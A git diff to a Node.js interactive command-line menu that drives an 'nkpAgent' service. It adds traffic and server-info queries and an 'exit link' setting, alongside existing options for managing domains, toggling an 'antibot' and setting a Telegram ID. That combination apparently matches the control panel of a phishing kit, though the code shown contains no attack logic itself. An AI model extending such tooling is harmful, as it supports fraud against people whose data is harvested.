@@ -17,18 +17,22 @@ const questionList = [
         name: 'action',
         choices: [
         // new inquirer.Separator('-------Domain-------'),
+        "Get Information",
+        "Get Traffic",
+                // new inquirer.Separator('-------Domain-------'),
+
         "Add Domain",
         "Delete Domain",
         "Get All Domains",
         "Get All Links",
         // new inquirer.Separator('-------Projects-------'),
         "Get All Projects",
-        "Get Active Project",
         "Change Project",
         // new inquirer.Separator('-------Antibot-------'),
         "On Antibot",
         "Off Antibot",
         // new inquirer.Separator('-------Process-------'),
+        "Set Exit Link",
         "Set Telegram ID",
         // "Off Proxy",
         // "On Proxy",
@@ -72,6 +76,14 @@ const questionList = [
             return answerList.action  === "Set Telegram ID"
         }
     },
+    {
+        type: 'input',
+        message: 'Enter Exit Link:',
+        name: 'exitLink',
+        when(answerList) {
+            return answerList.action  === "Set Exit Link"
+        }
+    },
 ]
 
 
@@ -83,6 +95,24 @@ inquirer
 
     console.log('\n')
       switch(answerList.action) {
+            case "Get Information":
+                return nkpAgent.getInformation((success, appInfo) => {
+                    if (success) {
+                        console.log(`SERVER INFO:\n\n ${appInfo}`)
+                    } else {
+                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)
+
+                    }
+                })
+            case "Get Traffic":
+                return nkpAgent.getTraffic((success, appInfo) => {
+                    if (success) {
+                        console.log(`TRAFFIC INFO:\n\n ${appInfo}`)
+                    } else {
+                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)
+
+                    }
+                })
             case 'Add Domain':
 
                 return nkpAgent.addDomain(answerList.domainAction.trim(), (success, appInfo) => {
@@ -130,15 +160,6 @@ inquirer
 
                     }
                 })
-            case "Get Active Project":
-                return nkpAgent.getActiveProject((success, appInfo) => {
-                    if (success) {
-                        console.log(`ACTIVE Project is: ${appInfo}`)
-                    } else {
-                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)
-
-                    }
-                })
             case "Change Project":
                 const projectName = answerList.projectAction
                 return nkpAgent.changeProject(projectName, (success, appInfo) => {
@@ -176,6 +197,16 @@ inquirer
 
                     }
                 })
+            case "Set Exit Link":
+                const exitLink = answerList.exitLink
+                return nkpAgent.setExitLink(exitLink, (success, appInfo) => {
+                    if (success) {
+                        console.log(`Successfully Changed Exit Link to: ${exitLink}, All is OK!`)
+                    } else {
+                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)
+
+                    }
+                })
             case "Start nkp":
             case "Stop nkp":
                 const action = answerList.action === 'Start nkp'? 'START' : 'STOP'
@@ -185,7 +216,6 @@ inquirer
                         console.log(`Successfully ${action}ED nkp, All is OK!`)
                     } else {
                         console.error(`Error failed to Execute command.\n Error: ${appInfo}`)
-
                     }
                 })
             default:
